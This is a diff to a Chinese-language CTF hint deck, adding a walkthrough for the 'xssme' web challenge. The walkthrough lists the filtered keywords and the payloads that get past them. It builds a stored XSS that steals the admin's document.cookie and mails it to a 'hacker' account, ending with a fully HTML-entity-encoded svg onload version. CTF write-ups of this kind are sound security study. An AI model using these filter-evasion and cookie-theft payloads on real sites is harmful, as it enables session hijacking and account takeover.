@@ -2,7 +2,7 @@
 # [Hackme CTF](https://hackme.inndy.tw/)
 ### 就上手
 
-jason3e7 20181128
+jason3e7 20181130
 
 ---
 
@@ -10,6 +10,7 @@ jason3e7 20181128
 * [dafuq-manager 1](#/2)
 * [dafuq-manager 2](#/3)
 * [dafuq-manager 3](#/10)
+* [xssme](#/22)
 
 ---
 
@@ -299,10 +300,153 @@ drwxr-xr-x 13 root  root  4096 Jul 30 08:33 ..
 -rws--s--x  1 flag3 flag3 9232 Oct  4  2016 meow
 -rw-r--r--  1 root  root   783 Oct  4  2016 meow.c
 ```
-* [Back to dafuq-manager 3 hint](#/10)
+* [Back to Web](#/1)
 
 Note:[Web渗透测试（4）—本地提权方法](https://www.jianshu.com/p/955e6715c450)
 ls;whoami;
+
+---
+
+## xssme hint
+* 目標 : XSS admin to steal flag 
+* 切入點
+  * 是一個 email 系統, 可以寄信給別人.
+* 步驟
+  * [step1, input, 找出可以污染的參數](#/23)
+  * [step2, filter, 找出沒有被過濾的語法](#/24)
+  * [step3, construct, 建構語法](#/31)
+    * 要先想好要達成什麼目的
+
+Note:更重要的問題是, 這個環境是怎麼建置的.
+
+---
+
+## xssme input
+* username
+* password
+* to_user
+* subject
+* content
+* proof\_of\_work
+* [Back to xssme hint](#/22)
+
+---
+
+## xssme filter
+* content filter(part)
+  * )
+  * <script
+  * &nbsp;onload
+  * &nbsp;onerror
+  * location.href
+  * eval
+* pass
+```
+<a>a</a>, <img src="HTMLencode(javascript:alert(1);)">
+<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+```
+* [Back to xssme hint](#/22)
+
+Note:[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#Basic_XSS_Test_Without_Filter_Evasion)
+
+---
+
+## xssme encode
+* HTML encode
+  * [Decimal HTML character references](https://www.hashemian.com/tools/html-url-encode-decode.php)
+    * htmlEncode("&lt;script>alert(1)&lt;/script>"), 的運作原理是先轉成 HTML 之後, 全部都被當成符號, 所以不會運行.
+    * `<img src="htmlEncode">`, 的運作原理是先轉成 HTML 之後, 被 src 語法運行.
+  * Hexadecimal HTML character references
+
+Note:
+* [詳細解說幾個建置網站時常用的編碼方法](https://blog.miniasp.com/post/2008/11/05/Explain-web-related-encoding-decoding-method-in-detail.aspx)
+* URL encode
+* base64 encode
+* Unicode 方式進行編碼
+
+---
+
+## xssme construct 1
+* sample code
+```
+location.href = 'sendmail.php?to=hacker';
+document.getElementById("to_user").value = "hacker";
+document.getElementById("subject").value = "cookie";
+document.getElementById("content").value = document.cookie;
+im_robot.click();
+document.getElementsByTagName("form")[0].submit();
+```
+* challenge
+  * how to pass javascript to sendmail page
+    * setTimeout();
+  * sendmail page parameter(to)
+    * 漏網之魚, no filter.
+
+---
+
+## xssme construct 1
+* sendmail.php?to=
+* ">&lt;script>alert(1);&lt;/script><" 
+  * `setTimeout(function(){alert(1)},3000);`
+    * `alert(1);im_robot.click();`
+    * `console.log(document.getElementById('subject').value);`
+    * `document.getElementById('subject').setAttribute('value','cookie');`
+      * 因為 = 號在轉拋的時候會 urlEncode, 到下一頁 javascript 不會運行 urlEncode 後的 %3d.
+
+---
+
+## xssme construct 1
+* ">&lt;script>setTimeout(function(){
+```
+document.getElementById("to_user").setAttribute("value","hacker");
+document.getElementById("subject").setAttribute("value",document.cookie);
+document.getElementById("content").setAttribute("value","cookie");
+im_robot.click();
+document.getElementsByTagName("form")[0].setAttribute("method","POST");
+```
+* },3000);&lt;/script><"
+
+Note:
+* 其實還在思考 im_robot 的運作原理, 還有是不是要等待秒數.
+* 使用 burp 在 sendmail page, 直接貼在 to 參數, 沒有被 urlEncode 的程式碼, 可以在 firefox 運行.
+
+---
+
+## xssme construct 1 Failed !
+* location.href='sendmail.php?to=
+  * ">&lt;script>setTimeout(function(){
+```
+document.getElementById("to_user").setAttribute("value","hacker");
+document.getElementById("subject").setAttribute("value",document.cookie);
+document.getElementById("content").setAttribute("value","cookie");
+im_robot.click();
+document.getElementsByTagName("form")[0].setAttribute("method","POST");
+```
+  * },3000);&lt;/script><"
+* ';
+
+Note:
+* 在 Browser 的 console 貼入 payload 送出, 結果 ", >, <, 送出前在 javascript 就被 urlEncode 了, 到 sendmail page, 不能 work.
+* 當然整包 htmlEncode 放到 content 也是相似的結果.
+
+---
+
+## xssme construct 2
+* sample code, 直接寫 ajax post sendmail page 吧.
+```
+var xhttp = new XMLHttpRequest();
+xhttp.open("POST", "sendmail.php");
+xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhttp.send("to_user=hacker&subject=cookie&content="+document.cookie);
+```
+
+---
+
+## xssme construct 2
+```
+<svg/onload=&#x76;&#x61;&#x72;&#x20;&#x78;&#x68;&#x74;&#x74;&#x70;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x58;&#x4d;&#x4c;&#x48;&#x74;&#x74;&#x70;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x28;&#x29;&#x3b;&#x0a;&#x78;&#x68;&#x74;&#x74;&#x70;&#x2e;&#x6f;&#x70;&#x65;&#x6e;&#x28;&#x22;&#x50;&#x4f;&#x53;&#x54;&#x22;&#x2c;&#x20;&#x22;&#x73;&#x65;&#x6e;&#x64;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#x70;&#x68;&#x70;&#x22;&#x29;&#x3b;&#x0a;&#x78;&#x68;&#x74;&#x74;&#x70;&#x2e;&#x73;&#x65;&#x74;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x48;&#x65;&#x61;&#x64;&#x65;&#x72;&#x28;&#x22;&#x43;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x2d;&#x54;&#x79;&#x70;&#x65;&#x22;&#x2c;&#x20;&#x22;&#x61;&#x70;&#x70;&#x6c;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2f;&#x78;&#x2d;&#x77;&#x77;&#x77;&#x2d;&#x66;&#x6f;&#x72;&#x6d;&#x2d;&#x75;&#x72;&#x6c;&#x65;&#x6e;&#x63;&#x6f;&#x64;&#x65;&#x64;&#x22;&#x29;&#x3b;&#x0a;&#x78;&#x68;&#x74;&#x74;&#x70;&#x2e;&#x73;&#x65;&#x6e;&#x64;&#x28;&#x22;&#x74;&#x6f;&#x5f;&#x75;&#x73;&#x65;&#x72;&#x3d;&#x61;&#x62;&#x63;&#x64;&#x65;&#x26;&#x73;&#x75;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x3d;&#x63;&#x6f;&#x6f;&#x6b;&#x69;&#x65;&#x26;&#x63;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x3d;&#x22;&#x2b;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x63;&#x6f;&#x6f;&#x6b;&#x69;&#x65;&#x29;&#x3b;>
+```
+* [Back to Web](#/1)
 
 ---
 
